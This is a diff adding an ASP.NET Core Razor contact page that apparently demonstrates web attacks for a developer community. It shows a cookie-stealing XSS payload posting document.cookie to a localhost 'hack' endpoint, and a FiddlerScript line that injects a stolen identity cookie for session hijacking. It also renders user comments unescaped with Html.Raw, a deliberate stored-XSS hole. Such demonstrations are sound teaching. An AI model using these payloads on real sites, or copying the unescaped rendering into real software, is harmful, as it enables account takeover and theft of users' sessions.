@@ -1,0 +1,33 @@
+@{
+    ViewData["Title"] = "Contact";
+    ViewData["Script"] = "<script>image = new Image(); image.src='http://localhost:50666/hack/?cookie='+document.cookie;</script>";
+}
+<h1>@ViewData["Title"]</h1>
+
+<address>
+    XantarDev Technical Community<br /
+    <a href="mailto:xantardev@outlook.com">xantardev@outlook.com</a><br />
+    <a href="http://xantardev.org">http://xantardev.org</a>
+</address>
+
+<p>Script: @ViewData["Script"]</p>
+<p>OnBeforeRequest on FiddlerScript: oSession.oRequest["Cookie"] = (".AspNetCore.Identity.Application=XXX;" + oSession.oRequest["Cookie"])</p>
+
+<hr />
+<strong>Comments:</strong>
+<hr />
+
+@foreach (var item in ViewBag.Comments)
+{
+    @Html.Raw(@item)
+    <hr />
+}
+
+<form method="post">
+    <div class="form-group">
+        <label for="Comment">Comment:</label>
+        <textarea class="form-control" id="Comment" name="Comment" rows="7" style="min-width: 50%"></textarea>
+    </div>
+
+    <input type="submit" value="Send" class="btn btn-secondary" />
+</form>
